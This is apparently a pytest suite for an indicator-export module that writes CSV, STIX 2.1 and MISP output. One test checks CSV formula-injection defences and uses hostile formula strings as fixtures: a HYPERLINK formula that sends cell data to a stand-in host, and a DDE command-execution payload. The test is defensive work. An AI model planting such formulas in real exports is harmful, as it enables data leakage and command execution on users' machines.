"""Tests for indicator export (CSV / STIX 2.1 / MISP)."""
from __future__ import annotations

import json
import os
import tempfile

import pytest

from app.database import get_connection, init_db
from app.export.csv_export import render_csv, sanitize_csv_cell
from app.export.misp_export import build_event
from app.export.query import (
    Indicator,
    _parse_since,
    _refine_type,
    fetch_indicators,
)
from app.export.stix_export import build_bundle
from app.repository import (
    insert_document,
    insert_match,
    upsert_watchlist_entry,
)


# --- type refinement ----------------------------------------------------
def test_refine_hash_by_length():
    assert _refine_type("hash", "a" * 32) == "md5"
    assert _refine_type("hash", "a" * 40) == "sha1"
    assert _refine_type("hash", "a" * 64) == "sha256"
    assert _refine_type("hash", "notahash") == "hash"


def test_refine_ip_v4_v6():
    assert _refine_type("ip", "1.2.3.4") == "ipv4"
    assert _refine_type("ip", "2001:db8::1") == "ipv6"


def test_refine_passthrough():
    assert _refine_type("domain", "x.com") == "domain"
    assert _refine_type("CVE", "CVE-2024-1") == "cve"


# --- since parsing ------------------------------------------------------
def test_parse_since_none():
    assert _parse_since(None) is None
    assert _parse_since("") is None


def test_parse_since_valid_forms():
    assert _parse_since("7d").endswith("Z")
    assert _parse_since("24h").endswith("Z")
    assert _parse_since("30m").endswith("Z")


def test_parse_since_invalid_raises():
    with pytest.raises(ValueError):
        _parse_since("banana")
    with pytest.raises(ValueError):
        _parse_since("7y")


# --- fetch_indicators (real DB) ----------------------------------------
@pytest.fixture
def conn():
    fd, path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    init_db(path)
    c = get_connection(path)
    try:
        yield c
    finally:
        c.close()
        os.unlink(path)


def _add_match(conn, *, wtype, value, severity="high", score=80, status="new",
               doc_hash="h1"):
    wl = upsert_watchlist_entry(conn, {
        "type": wtype, "value": value, "description": "t",
        "severity": severity, "enabled": True,
    })
    doc = insert_document(conn, {
        "source_name": "Feed", "source_type": "rss",
        "source_url": "https://f/1", "title": "doc",
        "raw_text": f"body {value}", "retrieved_at": "2026-01-01T00:00:00Z",
        "content_hash": doc_hash,
    })
    insert_match(
        conn, document_id=doc, watchlist_id=wl, matched_value=value,
        match_type=f"exact_{wtype}", context="ctx", severity=severity,
    )
    # Set score + status directly.
    conn.execute(
        "UPDATE matches SET score = ?, status = ? WHERE matched_value = ?",
        (score, status, value),
    )
    conn.commit()


def test_fetch_returns_indicators(conn):
    _add_match(conn, wtype="domain", value="evil.example", doc_hash="a")
    _add_match(conn, wtype="cve", value="CVE-2024-3400", doc_hash="b")
    inds = fetch_indicators(conn)
    types = {i.itype for i in inds}
    assert types == {"domain", "cve"}


def test_fetch_excludes_false_positive_by_default(conn):
    _add_match(conn, wtype="domain", value="fp.example", status="false_positive", doc_hash="a")
    _add_match(conn, wtype="domain", value="real.example", status="new", doc_hash="b")
    values = {i.value for i in fetch_indicators(conn)}
    assert "fp.example" not in values
    assert "real.example" in values


def test_fetch_min_severity_filter(conn):
    _add_match(conn, wtype="domain", value="low.example", severity="low", doc_hash="a")
    _add_match(conn, wtype="domain", value="high.example", severity="high", doc_hash="b")
    values = {i.value for i in fetch_indicators(conn, min_severity="high")}
    assert values == {"high.example"}


def test_fetch_dedupes_on_type_and_value(conn):
    # Same value matched in two docs → one indicator.
    _add_match(conn, wtype="domain", value="dup.example", score=50, doc_hash="a")
    _add_match(conn, wtype="domain", value="dup.example", score=90, doc_hash="b")
    inds = fetch_indicators(conn)
    dom = [i for i in inds if i.value == "dup.example"]
    assert len(dom) == 1
    # Higher score kept (ordered score desc).
    assert dom[0].score == 90


# --- CSV ----------------------------------------------------------------
def _sample_indicators():
    return [
        Indicator("evil.example", "domain", "high", 80, "2026-01-01T00:00:00Z",
                  "Feed", "https://f/1", "doc", "line1\nline2"),
        Indicator("CVE-2024-3400", "cve", "critical", 100, "2026-01-01T00:00:00Z",
                  "Feed", None, "doc", None),
        Indicator("keyword phrase", "keyword", "medium", 40, "2026-01-01T00:00:00Z",
                  "Feed", None, None, None),
    ]


def test_csv_header_and_rows():
    out = render_csv(_sample_indicators())
    lines = out.strip().splitlines()
    assert lines[0].startswith("type,value,severity")
    assert len(lines) == 4  # header + 3
    # Newline in context is flattened.
    assert "line1 line2" in out
    assert "\nline2" not in out.split("line1")[1][:10]


# --- CSV formula injection (CWE-1236) ----------------------------------
def test_sanitize_prefixes_formula_triggers():
    for bad in ("=1+1", "+1", "-1", "@SUM(A1)", "\tcmd", "\rgo"):
        assert sanitize_csv_cell(bad) == "'" + bad


def test_sanitize_leaves_benign_values_untouched():
    for ok in ("example.com", "CVE-2024-3400", "alice@example.com".lstrip("@"),
               "1.2.3.4", "", "normal text"):
        assert sanitize_csv_cell(ok) == ok


def test_sanitize_passes_non_strings():
    assert sanitize_csv_cell(42) == 42
    assert sanitize_csv_cell(None) is None


def test_render_csv_neutralizes_malicious_indicator_fields():
    """An indicator whose value/context/title come from a hostile document
    must not export a live formula."""
    evil = Indicator(
        value='=HYPERLINK("http://evil/"&A1,"x")',
        itype="domain", severity="high", score=80,
        first_seen="2026-01-01T00:00:00Z", source_name="@corp",
        source_url="https://f/1", doc_title="=cmd|'/c calc'!A1",
        context="-2+3+cmd",
    )
    out = render_csv([evil])
    # None of the dangerous cells may begin with a raw formula trigger; each
    # is prefixed with a single quote.
    assert "'=HYPERLINK" in out
    assert "'=cmd|" in out
    assert "'-2+3+cmd" in out
    assert "'@corp" in out
    # And no data row cell starts a formula unescaped.
    data_rows = out.strip().splitlines()[1:]
    for row in data_rows:
        for cell in row.split(","):
            unquoted = cell.strip().strip('"')
            assert not unquoted[:1] in ("=", "+", "-", "@"), row


# --- STIX ---------------------------------------------------------------
def test_stix_maps_observables_and_cve():
    bundle, skipped = build_bundle(_sample_indicators())
    objs = bundle["objects"]
    by_type = {}
    for o in objs:
        by_type.setdefault(o["type"], []).append(o)
    assert "indicator" in by_type          # domain
    assert "vulnerability" in by_type      # cve
    assert skipped == 1                     # keyword has no mapping
    ind = by_type["indicator"][0]
    assert ind["pattern"] == "[domain-name:value = 'evil.example']"
    assert ind["pattern_type"] == "stix"
    assert ind["spec_version"] == "2.1"


def test_stix_hash_pattern_paths():
    inds = [
        Indicator("a" * 64, "sha256", "high", 80, "t", None, None, None, None),
        Indicator("b" * 32, "md5", "high", 80, "t", None, None, None, None),
    ]
    bundle, _ = build_bundle(inds)
    patterns = {o["pattern"] for o in bundle["objects"]}
    assert "[file:hashes.'SHA-256' = '%s']" % ("a" * 64) in patterns
    assert "[file:hashes.'MD5' = '%s']" % ("b" * 32) in patterns


def test_stix_ids_are_deterministic():
    ind = [Indicator("evil.example", "domain", "high", 80, "t", None, None, None, None)]
    b1, _ = build_bundle(ind)
    b2, _ = build_bundle(ind)
    id1 = b1["objects"][0]["id"]
    id2 = b2["objects"][0]["id"]
    assert id1 == id2  # same indicator → same id (uuid5)
    assert id1.startswith("indicator--")


def test_stix_pattern_escapes_quotes():
    ind = [Indicator("o'brien.example", "domain", "high", 80, "t", None, None, None, None)]
    bundle, _ = build_bundle(ind)
    assert "\\'" in bundle["objects"][0]["pattern"]


# --- MISP ---------------------------------------------------------------
def test_misp_attribute_mapping_and_threat_level():
    event, skipped = build_event(_sample_indicators())
    ev = event["Event"]
    attr_types = {a["type"] for a in ev["Attribute"]}
    assert "domain" in attr_types
    assert "vulnerability" in attr_types
    assert skipped == 1  # keyword skipped
    # critical present → threat level 1.
    assert ev["threat_level_id"] == "1"


def test_misp_cve_not_to_ids():
    event, _ = build_event([
        Indicator("CVE-2024-3400", "cve", "high", 80, "t", None, None, None, None),
    ])
    cve_attr = event["Event"]["Attribute"][0]
    assert cve_attr["type"] == "vulnerability"
    assert cve_attr["to_ids"] is False


def test_misp_domain_is_to_ids():
    event, _ = build_event([
        Indicator("evil.example", "domain", "high", 80, "t", "Feed", None, None, None),
    ])
    attr = event["Event"]["Attribute"][0]
    assert attr["to_ids"] is True
    assert "source=Feed" in attr["comment"]


def test_misp_custom_info():
    event, _ = build_event(_sample_indicators(), info="My IOC pack")
    assert event["Event"]["info"] == "My IOC pack"


def test_json_serializable():
    inds = _sample_indicators()
    bundle, _ = build_bundle(inds)
    event, _ = build_event(inds)
    # Must round-trip through json without error.
    assert json.loads(json.dumps(bundle))["type"] == "bundle"
    assert "Event" in json.loads(json.dumps(event))
